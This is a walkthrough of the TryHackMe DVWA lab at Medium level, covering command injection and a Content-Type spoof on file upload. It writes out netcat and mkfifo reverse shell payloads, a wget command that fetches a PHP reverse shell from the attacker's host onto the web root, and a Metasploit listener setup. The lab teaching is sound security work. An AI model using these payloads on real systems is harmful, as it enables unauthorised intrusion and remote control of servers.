# Shells Session Writeup - DVWA

To start the challenge, visit [https://tryhackme.com/room/dvwa](https://tryhackme.com/room/dvwa). If you don't have a [Kali VM](https://shefesh.com/wiki/fundamental-skills/misc---setting-up-a-virtual-machine.pdf) you can use the built-in Attack Box:

![[Pasted image 20211121223427.png]]

Visit the IP of the DVWA instance in your browser.

![[Pasted image 20211121223522.png]]

Log in to the application with `admin`:`password`, and you'll see the welcome screen:

![[Pasted image 20211121223548.png]]

Set the 'Security Level' to one of Low, Medium, or High (Impossible fixes the vulnerability):

![[Pasted image 20211121223624.png]]

We will look at the Medium difficulty in this solution.

## Command Injection

You can try a couple of different commands to get a reverse shell. I'll walk through the methodology then present the correct solution.

### Starting a Listener

First, start a listener with netcat (`nc`) so you can catch the shell:

```bash
$ sudo nc -lnvp 413
```

This is listening on port 413, but you can change the port to whatever you like - remember that sometimes a well-known port will be more successful when trying to get a reverse shell.

You could also use a metasploit handler:

```bash
$ sudo msfconsole -q
msf6> use exploit/multi/handler

...[set the payload to a generic listener]...

msf6 exploit(multi/handler) > set payload linux/x86/shell/reverse_tcp
payload => linux/x86/shell/reverse_tcp

...[set the host to your attacking machine IP and listening port]...

msf6 exploit(multi/handler) > set lhost 10.10.113.99
lhost => 10.10.113.99
msf6 exploit(multi/handler) > set lport 413
lport => 413

...[start the listener with run or exploit]...

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.113.99:413
```

### Command Injection Theory

The idea of command injection is to trick the server into executing our code as part of the `ping` command it is running on the back-end.

The first step is usually to use the functionality legitimately and see what happens. Entering an IP returns output that looks like this:

![[Pasted image 20211121224601.png]]

So it's likely the server is running a command like this:

```bash
$ ping -c 4 [USER_INPUT]
```

There are a few characters we can use to chain commands in linux. We could use any of the following in theory, and just need to test until we find one that works:
- `& [COMMAND]` to run our command if the intended command finishes executing
- `|| [COMMAND]` to run our command whether or not the intended command finishes executing
- `; [COMMAND]` to run our command immediately after the intended command
- `` `[COMMAND]` `` to run our command *first* (anything in backticks is evaluated then run as part of the original command)

For example, with a semicolon-based payload `0.0.0.0; echo "Code Execution!"` our command would look like this when evaluated by the server:

```bash
$ ping -c 4 0.0.0.0; echo "Code Execution!"
```

### Verifying Code Execution

We can try inputting the following into the input box to get a reverse shell immediately:

```
`nc -e /bin/bash 10.10.113.99 413`
```

This doesn't work, so let's try a `ping` command to verify whether or not we have *Remote Code Execution* via this command injection vulnerability.

We run a `tcpdump` command to listen for a ping (an ICMP request) on whatever interface we are using to connect to TryHackMe (if you're using Attack Box, it's `eth0` - if you're using OpenVPN, it's probably `tun0`):

```bash
$ sudo tcpdump -i [INTERFACE] -n icmp
```

Then we send a payload to ping our machine within the backticks:

```
`ping -c 1 10.10.113.99`127.0.0.1
```

We can see that this works (a little too well - we have a *lot* of ping requests coming back to our machine):

![[Pasted image 20211121224508.png]]

This verifies code execution.

### File Writing

We can test code execution further by trying to write to a file accessible by the webserver. Most servers on Linux are hosted within the `/var/www/html` directory by default, so let's try to write a file there - if it works, we should be able to view it in browser.

Submitting this payload to the input box should take the output of the `which nc` command and redirect it to a file `hello.html` on the server:

```
`echo $(which nc) > /var/www/html/hello.html`
```

Sure enough, the file contains the output of the command:

![[Pasted image 20211121224706.png]]

This verifies that `netcat` is installed on the target machine. We can try a couple more reverse shell payloads - remember to check [revshells.com](https://revshells.com) to look for new ones.

This reverse shell command is often reliable:

```
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.113.99 413 >/tmp/f`
```

In this case we get a shell, but it is closed instantly:

![[Pasted image 20211121225027.png]]

Other reverse shell commands give no response. It's time to change our strategy.

### Staged Payload

We'll use our file writing strategy to write a web shell to the server and execute it. Luckily Kali Linux has some prewritten webshells installed.

We can figure out the site uses PHP by looking at the site headers. The file `/usr/share/webshells/php/php-reverse-shell.php` contains a great reverse shell written in PHP. We just have to edit some values:

![[Pasted image 20211121225454.png]]

We have to add our IP address (find this with `ip a` or `ifconfig [INTERFACE]`) and our listening port (in our case, `413`).

We can then start a Python HTTP server in the directory where the webserver is stored. This allows the target machine to make requests to our machine, which is serving the reverse shell file. If we use the command injection to run `wget`, we can write the webshell to the file system.

Start a Python webserver with the following command:

```bash
$ python3 -m http.server [PORT]
```

The server listens on port 8000 by default. On the Attack Box this port is already in use, so we'll use port 8001.

```bash
$ python3 -m http.server 8001
Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
```

We can then submit the following `wget` command to the input field, using the `-O` flag to save the output to a specific file:

```
`wget http://10.10.113.99:8001/php-reverse-shell.php -O /var/www/html/rev.php`
```

We can see the target machine makes a HTTP GET request to our machine:

![[Pasted image 20211121225817.png]]

Now, when we visit `/rev.php` in browser, the page 'hangs' while it attempts to load the file - this is usually a good sign, as it means some PHP code is running in the background:

![[Pasted image 20211121225903.png]]

Sure enough, when we check our listener we have a shell!

![[Pasted image 20211121225935.png]]

### Summary of Commands

- edit `/usr/share/webshells/php/php-reverse-shell.php` to include your IP and Port
- Start a Python server to serve `php-reverse-shell.php` with `cd /usr/share/webshells/php/; python3 -m http.server 8001`
- Submit the following command in the website to download your reverse shell to the machine: `` `wget http://10.10.113.99:8001/php-reverse-shell.php -O /var/www/html/rev.php` ``
- Start a listener with netcat to catch the shell: `nc -lnvp 413`
- Visit `http://TARGET_IP/rev.php` to trigger the shell, and enjoy!

## File Upload

We can reuse the reverse shell file we just created for this vulnerability. Attempting to upload it directly fails:

![[Pasted image 20211121230551.png]]

Often, browsers indicate the type of content the user is sending with a header in the HTTP request, usually `Content-Type` - we can see it in the request using our Developer Tools:

![[Pasted image 20211121230646.png]]

We can Edit and Resend this request to see the type more clearly:

![[Pasted image 20211121230757.png]]

If we want to trick the website into thinking this is an image, we can try changing the header to `image/jpeg`:

![[Pasted image 20211121230915.png]]

The response shows a `200 OK`, and the path of our new file on the server!

![[Pasted image 20211121230956.png]]

If we restart our listener with `nc -lnvp 413` and visit `/hackable/uploads/php-reverse-shell.php` in browser, we trigger the shell:

![[Pasted image 20211121231045.png]]